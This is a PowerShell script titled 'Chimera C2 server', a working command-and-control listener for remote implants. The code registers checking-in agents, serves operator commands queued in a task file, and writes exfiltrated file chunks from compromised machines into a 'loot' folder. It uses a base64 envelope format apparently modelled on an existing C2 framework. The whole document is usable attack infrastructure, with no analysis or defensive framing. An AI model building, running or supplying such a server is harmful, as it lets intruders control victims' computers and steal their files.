# Chimera C2 server
# Usage: powershell -ExecutionPolicy Bypass -File c2server.ps1

param(
    [string]$Bind     = "http://127.0.0.1:8080/",
    [string]$LootDir  = "C:\Users\Public\c2_loot",
    [string]$TaskFile = "C:\Temp\c2task.txt"
)

Set-StrictMode -Off
$ErrorActionPreference = "Continue"
New-Item -ItemType Directory -Force -Path $LootDir | Out-Null
New-Item -ItemType Directory -Force -Path "C:\Temp"  | Out-Null

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($Bind)
$listener.Start()
Write-Host "[C2] Listening on $Bind"
Write-Host "[C2] Task queue:  Set-Content $TaskFile 'command params'"
Write-Host "[C2] Press Ctrl+C to stop"
Write-Host ""

function Wrap($json) {
    $uuid = "aabbccdd-aabb-aabb-aabb-aabbccddeeff"
    $ub = [System.Text.Encoding]::UTF8.GetBytes($uuid)
    $jb = [System.Text.Encoding]::UTF8.GetBytes($json)
    $c  = New-Object byte[]($ub.Length + $jb.Length)
    [Array]::Copy($ub,0,$c,0,$ub.Length)
    [Array]::Copy($jb,0,$c,$ub.Length,$jb.Length)
    return [System.Convert]::ToBase64String($c)
}

function DecodeBody($raw) {
    try {
        $b = [System.Convert]::FromBase64String($raw.Trim())
        if ($b.Length -gt 36) { return [System.Text.Encoding]::UTF8.GetString($b, 36, $b.Length - 36) }
    } catch {}
    return $raw
}

# Run HTTP loop on a background runspace so main thread stays alive
$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$rs.Open()
$rs.SessionStateProxy.SetVariable("listener", $listener)
$rs.SessionStateProxy.SetVariable("LootDir",  $LootDir)
$rs.SessionStateProxy.SetVariable("TaskFile", $TaskFile)

$ps = [System.Management.Automation.PowerShell]::Create()
$ps.Runspace = $rs
[void]$ps.AddScript({
    function Wrap($json) {
        $uuid = "aabbccdd-aabb-aabb-aabb-aabbccddeeff"
        $ub = [System.Text.Encoding]::UTF8.GetBytes($uuid)
        $jb = [System.Text.Encoding]::UTF8.GetBytes($json)
        $c  = New-Object byte[]($ub.Length + $jb.Length)
        [Array]::Copy($ub,0,$c,0,$ub.Length)
        [Array]::Copy($jb,0,$c,$ub.Length,$jb.Length)
        return [System.Convert]::ToBase64String($c)
    }

    while ($listener.IsListening) {
        try {
            $ctx  = $listener.GetContext()
            $req  = $ctx.Request
            $resp = $ctx.Response
            $ts   = (Get-Date).ToString("HH:mm:ss")

            $ms = New-Object System.IO.MemoryStream
            if ($req.HasEntityBody) { $req.InputStream.CopyTo($ms) }
            $raw = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())

            # Decode base64+UUID envelope
            $body = $raw
            try {
                $b = [System.Convert]::FromBase64String($raw.Trim())
                if ($b.Length -gt 36) { $body = [System.Text.Encoding]::UTF8.GetString($b, 36, $b.Length - 36) }
            } catch {}

            $replyJson = "{}"

            if ($body -match '"action"\s*:\s*"checkin"') {
                $agentID = "unknown"
                if ($body -match '"uuid"\s*:\s*"([^"]+)"') { $agentID = $Matches[1] }
                $replyJson = '{"action":"checkin","id":"' + $agentID + '","tasks":[]}'
                [Console]::WriteLine("[$ts] >>> CHECKIN  agent=$agentID")

            } elseif ($body -match '"action"\s*:\s*"get_tasking"') {
                $tasks = "[]"
                if (Test-Path $TaskFile) {
                    $fc = (Get-Content $TaskFile -Raw).Trim()
                    Remove-Item $TaskFile -Force -ErrorAction SilentlyContinue
                    if ($fc -match '^(\S+)\s*(.*)$') {
                        $tc  = $Matches[1]
                        $tp  = $Matches[2].Trim()
                        $tid = [System.Guid]::NewGuid().ToString("N").Substring(0,16)
                        $safe = $tp -replace '\\','\\' -replace '"','\"'
                        $tasks = '[{"id":"'+$tid+'","command":"'+$tc+'","parameters":"'+$safe+'"}]'
                        [Console]::WriteLine("[$ts] >>> TASK: $tc [$tp]  id=$tid")
                    }
                } else {
                    [Console]::WriteLine("[$ts]     beacon (idle)")
                }
                $replyJson = '{"action":"get_tasking","tasks":' + $tasks + '}'

            } elseif ($body -match '"action"\s*:\s*"post_response"') {
                if ($body -match '"download"') {
                    $fname = "loot_$((Get-Date).ToString('HHmmss')).bin"
                    if ($body -match '"full_path"\s*:\s*"([^"]+)"') {
                        $fname = [System.IO.Path]::GetFileName(($Matches[1] -replace '\\\\','\'))
                    }
                    if ($body -match '"chunk_data"\s*:\s*"([A-Za-z0-9+/=]+)"') {
                        $data = [System.Convert]::FromBase64String($Matches[1])
                        $out  = [System.IO.Path]::Combine($LootDir, $fname)
                        [System.IO.File]::WriteAllBytes($out, $data)
                        [Console]::WriteLine("[$ts] <<< FILE: $fname  ($([int]($data.Length/1024)) KB) -> $out")
                    }
                } else {
                    if ($body -match '"output"\s*:\s*"((?:[^"\\]|\\.)*)"') {
                        $out = $Matches[1] -replace '\\n',"`n" -replace '\\"','"'
                        [Console]::WriteLine("[$ts] <<< OUTPUT:`n$out`n")
                    } else {
                        [Console]::WriteLine("[$ts] <<< post_response (no output field)")
                    }
                }
                $replyJson = '{"action":"post_response","responses":[]}'

            } else {
                [Console]::WriteLine("[$ts] <<< unknown ($($body.Length) chars)")
            }

            $rb = [System.Text.Encoding]::UTF8.GetBytes((Wrap $replyJson))
            $resp.ContentType     = "application/json"
            $resp.ContentLength64 = $rb.Length
            $resp.OutputStream.Write($rb, 0, $rb.Length)
            $resp.Close()

        } catch [System.Net.HttpListenerException] {
            break
        } catch {
            [Console]::WriteLine("[ERR] $_")
            try { $ctx.Response.Close() } catch {}
        }
    }
})

$handle = $ps.BeginInvoke()

# Keep main thread alive
try {
    while ($listener.IsListening) { Start-Sleep -Seconds 1 }
} finally {
    $listener.Stop()
    $ps.Stop()
    $rs.Close()
    Write-Host "[C2] Stopped."
}
